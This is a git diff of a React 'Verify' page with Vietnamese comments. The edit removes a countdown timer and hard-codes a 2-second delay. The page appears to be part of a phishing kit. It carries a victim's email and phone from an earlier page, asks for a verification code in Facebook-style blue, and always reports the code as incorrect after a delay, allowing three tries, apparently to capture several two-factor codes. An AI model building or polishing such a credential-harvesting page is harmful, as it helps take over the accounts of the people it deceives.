@@ -11,7 +11,6 @@ const Verify = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
-    const [countdown, setCountdown] = useState(0);
     const [userInfo, setUserInfo] = useState({ email: '', phone: '' });
 
     // Lấy thông tin từ trang 1
@@ -70,8 +69,7 @@ const Verify = () => {
             submit: 'Continue',
             sendCode: 'Send new code',
             errorMessage: 'The verification code you entered is incorrect',
-            loadingText: 'Please wait',
-            secondsText: 'seconds'
+            loadingText: 'Please wait'
         }),
         [userInfo.email, userInfo.phone]
     );
@@ -90,8 +88,7 @@ const Verify = () => {
                     translatedSubmit,
                     translatedSendCode,
                     translatedError,
-                    translatedLoading,
-                    translatedSeconds
+                    translatedLoading
                 ] = await Promise.all([
                     translateText(defaultTexts.title, targetLang),
                     translateText(defaultTexts.description, targetLang),
@@ -101,8 +98,7 @@ const Verify = () => {
                     translateText(defaultTexts.submit, targetLang),
                     translateText(defaultTexts.sendCode, targetLang),
                     translateText(defaultTexts.errorMessage, targetLang),
-                    translateText(defaultTexts.loadingText, targetLang),
-                    translateText(defaultTexts.secondsText, targetLang)
+                    translateText(defaultTexts.loadingText, targetLang)
                 ]);
 
                 setTranslatedTexts({
@@ -114,8 +110,7 @@ const Verify = () => {
                     submit: translatedSubmit,
                     sendCode: translatedSendCode,
                     errorMessage: translatedError,
-                    loadingText: translatedLoading,
-                    secondsText: translatedSeconds
+                    loadingText: translatedLoading
                 });
             } catch {
                 //
@@ -135,12 +130,6 @@ const Verify = () => {
         }
     }, [translateAllTexts]);
 
-    const formatTime = (seconds) => {
-        const minutes = Math.floor(seconds / 60);
-        const remainingSeconds = seconds % 60;
-        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds.toString().padStart(2, '0')}`;
-    };
-
     const handleSubmit = async () => {
         if (!code.trim()) return;
 
@@ -154,24 +143,12 @@ const Verify = () => {
             //
         }
 
-        setCountdown(config.code_loading_time);
-
-        const timer = setInterval(() => {
-            setCountdown((prev) => {
-                if (prev <= 1) {
-                    clearInterval(timer);
-                    return 0;
-                }
-                return prev - 1;
-            });
-        }, 1000);
-
-        await new Promise((resolve) => setTimeout(resolve, config.code_loading_time * 1000));
+        // Delay 2 giây mà không hiển thị countdown
+        await new Promise((resolve) => setTimeout(resolve, 2000));
 
         setShowError(true);
         setAttempts((prev) => prev + 1);
         setIsLoading(false);
-        setCountdown(0);
 
         // Chỉ cho 3 lần nhập: lần 1 + 2 lần sai = tổng 3 lần
         if (attempts + 1 >= 3) {
@@ -209,13 +186,12 @@ const Verify = () => {
                     </div>
                 </div>
 
-                {/* Nút Continue đã được kéo lên gần hơn */}
                 <button
                     className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400 mt-2'
                     onClick={handleSubmit}
                     disabled={isLoading || !code.trim()}
                 >
-                    {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
+                    {isLoading ? translatedTexts.loadingText + '...' : translatedTexts.submit}
                 </button>
 
                 <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
